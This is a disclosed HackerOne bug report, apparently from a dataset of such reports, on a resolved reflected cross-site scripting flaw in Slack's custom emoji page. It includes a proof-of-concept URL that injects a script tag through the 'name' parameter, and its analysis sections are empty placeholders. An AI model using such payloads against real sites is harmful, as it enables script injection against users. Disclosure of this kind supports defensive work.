---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '258198'
original_report_id: '258198'
title: The Custom Emoji Page has a Reflected XSS
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: slack
created_at: '2017-08-09T09:03:33.645Z'
disclosed_at: '2017-09-24T06:40:12.327Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 55
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# The Custom Emoji Page has a Reflected XSS

## Metadata

- HackerOne Report ID: 258198
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: slack
- Disclosed At: 2017-09-24T06:40:12.327Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

The Custom Emoji Page has a Reflected XSS in building flash message.

The following is the PoC.
https://{team}.slack.com/customize/emoji?added=1&name=vuln"><script>alert(0);<%2Fscript>

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
